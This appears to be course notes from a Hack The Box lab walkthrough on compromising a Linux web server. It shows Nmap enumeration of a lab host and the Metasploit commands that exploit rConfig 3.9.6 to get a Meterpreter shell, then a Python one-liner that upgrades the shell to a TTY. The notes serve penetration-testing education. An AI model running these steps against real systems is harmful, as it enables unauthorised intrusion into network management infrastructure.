# Infiltrating Unix/Linux

***

### <mark style="color:red;">Common Considerations</mark>

* What distribution of Linux is the system running?
* What shell & programming languages exist on the system?
* What function is the system serving for the network environment it is on?
* What application is the system hosting?
* Are there any known vulnerabilities?

***

### <mark style="color:red;">Gaining a Shell Through Attacking a Vulnerable Application</mark>

As in most engagements, we will start with an initial enumeration of the system using `Nmap`.

<mark style="color:green;">**Enumerate the Host**</mark>

```bash
mrroboteLiot@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

`What information could we gather from the output?`

Considering we can see the system is listening on ports 80 (`HTTP`), 443 (`HTTPS`), 3306 (`MySQL`), and 21 (`FTP`), it may be safe to assume that this is a web server hosting a web application. We can also see some version numbers revealed associated with the web stack (`Apache 2.4.6` and `PHP 7.2.34` ) and the distribution of Linux running on the system (`CentOS`). Before deciding on a direction to research further (dive down a rabbit hole), we should also try navigating to the IP address through a web browser to discover the hosted application if possible.

<mark style="color:green;">**rConfig Management Tool**</mark>

![image](https://academy.hackthebox.com/storage/modules/115/rconfig.png)

{% hint style="danger" %}
Here we discover a network configuration management tool called [rConfig](https://www.rconfig.com). This application is used by network & system administrators to automate the process of configuring network appliances. One practical use case would be to use rConfig to remotely configure network interfaces with IP addressing information on multiple routers simultaneously. This tool saves admins time but, if compromised, could be used to pivot onto critical network devices that switch & route packets across the network. A malicious attacker could own the entire network through rConfig since it will likely have admin access to all the network appliances used to configure. As pentesters, finding a vulnerability in this application would be considered a very critical discovery.
{% endhint %}

***

### <mark style="color:red;">Discovering a Vulnerability in rConfig</mark>

Take a close look at the bottom of the web login page, and we can see the rConfig version number (`3.9.6`). We should use this information to start looking for any `CVEs`, `publicly available exploits`, and `proof of concepts` (`PoCs`). As we research, be sure to look closely at what we find and understand what it is doing. We, of course, want it to lead us to a shell session with the target.

Using your search engine of choice will turn up some promising results. We can use the keywords: `rConfig 3.9.6 vulnerability.`

![image](https://academy.hackthebox.com/storage/modules/115/rconfigresearch.png)

<mark style="color:green;">**Search For an Exploit Module**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution
```
{% endcode %}

This search can point us to the source code for an exploit module called `rconfig_vendors_auth_file_upload_rce.rb`. This exploit can get us a shell session on a target Linux box running rConfig 3.9.6. If this exploit did not show up in the MSF search, we can copy the code from this repo onto our local attack box and save it in the directory that our local install of MSF is referencing. To do this, we can issue this command on our attack box:

<mark style="color:green;">**Locate**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ locate exploits
```

We want to look for the directories in the output associated with Metasploit Framework. On Pwnbox, Metasploit exploit modules are kept in:

`/usr/share/metasploit-framework/modules/exploits`

We can copy the code into a file and save it in `/usr/share/metasploit-framework/modules/exploits/linux/http` similar to where they are storing the code in the GitHub repo. We should also keep msf up to date using the commands `apt update; apt install metasploit-framework` or your local package manager. Once we find the exploit module and download it (we can use wget) or copy it into the proper directory from Github, we can use it to gain a shell session on the target. If we copy it into a file on our local system, make sure the file has `.rb` as the extension. All modules in MSF are written in Ruby.

***

### <mark style="color:red;">Using the rConfig Exploit and Gaining a Shell</mark>

In msfconsole, we can manually load the exploit using the command:

<mark style="color:green;">**Select an Exploit**</mark>

```shell-session
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

With this exploit selected, we can list the options, input the proper settings specific to our network environment, and launch the exploit.

Use what you have learned in the module thus far to fill out the options associated with the exploit.

<mark style="color:green;">**Execute the Exploit**</mark>

```shell-session
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
```

We can see from the steps outlined in the exploitation process that this exploit:

* Checks for the vulnerable version of rConfig
* Authenticates with the rConfig web login
* Uploads a PHP-based payload for a reverse shell connection
* Deletes the payload
* Leaves us with a Meterpreter shell session

<mark style="color:green;">**Interact With the Shell**</mark>

<pre class="language-shell-session"><code class="lang-shell-session"><strong>meterpreter > shell
</strong></code></pre>

***

### <mark style="color:red;">Spawning a TTY Shell with Python</mark>

When we drop into the system shell, we notice that no prompt is present, yet we can still issue some system commands. This is a shell typically referred to as a `non-tty shell`. These shells have limited functionality and can often prevent our use of essential commands like `su` (`switch user`) and `sudo` (`super user do`), which we will likely need if we seek to escalate privileges. This happened because the payload was executed on the target by the apache user. Our session is established as the apache user. Normally, admins are not accessing the system as the apache user, so there is no need for a shell interpreter language to be defined in the environment variables associated with apache.

We can manually spawn a TTY shell using Python if it is present on the system. We can always check for Python's presence on Linux systems by typing the command: `which python`. To spawn the TTY shell session using Python, we type the following command:

**Interactive Python**

```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

This command uses python to import the [pty module](https://docs.python.org/3/library/pty.html), then uses the `pty.spawn` function to execute the `bourne shell binary` (`/bin/sh`). We now have a prompt (`sh-4.2$`) and access to more system commands to move about the system as we please.

{% hint style="warning" %}
Lorsqu'un payload est exécuté, par exemple via un serveur web (comme Apache), il est exécuté dans le contexte de l'utilisateur qui exécute le serveur. Dans ce cas, cela pourrait être l'utilisateur **apache**. Cet utilisateur n'a souvent pas un accès complet au système et peut ne pas avoir une **shell interactive** par défaut. En fait :

* **Absence d'une configuration d'environnement adéquate** : L'utilisateur Apache n'a pas nécessairement les mêmes variables d'environnement que les utilisateurs normaux, ce qui signifie que des shells comme `/bin/bash` ou `/bin/sh` peuvent ne pas se comporter comme prévu.
{% endhint %}
